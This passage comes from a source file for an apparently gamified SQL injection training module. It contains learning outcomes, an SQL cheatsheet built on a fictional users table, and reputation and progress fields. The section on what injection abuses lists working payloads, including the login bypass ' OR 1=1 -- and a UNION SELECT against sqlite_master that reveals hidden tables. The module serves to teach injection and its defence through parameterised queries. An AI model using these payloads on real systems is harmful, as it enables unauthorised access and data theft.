  takeaway: "If a system builds its query from your text, your text can become the query. Parameterised queries are the only real fix.",
  outcome: [
    "Spot an injectable field by breaking its query with a single quote and reading the SQL error it throws back.",
    "Bypass a login with no password by closing the string and commenting out the check, such as ' OR 1=1 --.",
    "Count a query's columns with ORDER BY, then UNION a different table out through a search box - staff records, card data, or a hidden secrets table.",
    "Explain why parameterised queries kill injection for good where stripping quotes or banning 'UNION' never will.",
  ],
  cheatsheet: {
    title: "SQL quick reference",
    blurb: "Everything the app uses to talk to its database, in plain words. You do not need to memorise any of it: it lives here, open it whenever you like.",
    sample: {
      caption: "Here is a tiny 'users' table. Every example below reads from this one, so you can see exactly what each query would hand back.",
      cols: ["id", "name", "email", "role"],
      rows: [
        ["41", "Sam Okafor", "sam@northwind.range", "staff"],
        ["42", "Priya Shah", "priya@northwind.range", "staff"],
        ["43", "Lee Grant", "lee@northwind.range", "admin"],
      ],
    },
    groups: [
      {
        heading: "Reading data (the everyday stuff)",
        entries: [
          { code: "SELECT", what: "Asks for specific columns. The start of almost every query.", example: "SELECT name, email  ->  the name and email columns" },
          { code: "FROM", what: "Says which table to read from.", example: "FROM users" },
          { code: "WHERE", what: "Keeps only the rows that match a condition.", example: "WHERE id = 42  ->  the Priya Shah row" },
          { code: "ORDER BY", what: "Sorts the results by a column, or by column number.", example: "ORDER BY name" },
          { code: "LIMIT", what: "Returns only the first few rows.", example: "LIMIT 10" },
        ],
      },
      {
        heading: "Matching and combining",
        entries: [
          { code: "AND / OR", what: "Join conditions. AND needs both true, OR needs either one.", example: "WHERE age > 12 AND city = 'Leeds'" },
          { code: "LIKE", what: "Matches a text pattern. The % sign means 'anything can go here'.", example: "WHERE email LIKE '%@school.uk'" },
          { code: "UNION", what: "Glues a second SELECT's results onto the first. Both must return the same number of columns.", example: "... UNION SELECT a, b FROM other" },
        ],
      },
      {
        heading: "Changing data (you only READ in this range)",
        entries: [
          { code: "INSERT", what: "Adds a brand new row to a table.", example: "INSERT INTO users ..." },
          { code: "UPDATE", what: "Changes rows that already exist.", example: "UPDATE users SET ..." },
          { code: "DELETE", what: "Removes rows. Off-limits on a real job without written permission.", example: "DELETE FROM users WHERE ..." },
        ],
      },
      {
        heading: "The bits injection abuses",
        entries: [
          { code: "'  (a single quote)", what: "Ends a piece of text inside the query. Slip one in where the app did not expect it and the rest of your typing can become commands.", example: "email = '' OR 1=1" },
          { code: "--  (two dashes)", what: "A comment. The database ignores everything after it on the line, so you can switch off the password check.", example: "' OR 1=1 --" },
          { code: "OR 1=1", what: "A condition that is always true, so the query matches every row, or lets you straight in.", example: "' OR 1=1 --" },
          { code: "sqlite_master", what: "A hidden built-in table that lists every other table. UNION it out to see what is really in the database.", example: "UNION SELECT name FROM sqlite_master" },
        ],
      },
    ],
  },
  rep: 70,
  repRank: "Junior Operator",
  repTo: "205 / 300 to Operator",
  next: "NEXT MODULE · Cross-Site Scripting →",
};

export default function Module5() {
  return <Engagement mod={MODULE5} />;
}
